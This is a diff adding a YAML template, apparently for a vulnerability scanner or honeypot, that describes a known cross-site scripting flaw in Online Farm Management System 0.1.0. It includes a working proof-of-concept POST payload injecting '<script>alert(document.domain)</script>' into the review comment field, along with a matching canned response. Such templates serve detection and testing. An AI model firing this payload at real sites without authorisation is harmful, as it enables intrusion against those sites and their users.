@@ -1,0 +1,32 @@
+id: onlinefarm-management-xss
+info:
+  name: Online Farm Management System 0.1.0 - Cross-Site Scripting
+  author: arafatansari
+  description: 'Online Farm Management System 0.1.0 contains a cross-site scripting
+    vulnerability via the review.php file.
+
+    '
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/48673
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 1
+  tags: onlinefarm,cms,xss,edb
+traps:
+- request:
+    method: POST
+    path: /reviewInput.php?pid=1
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: '<em style="color: black;"><script>alert(document.domain)</script>'
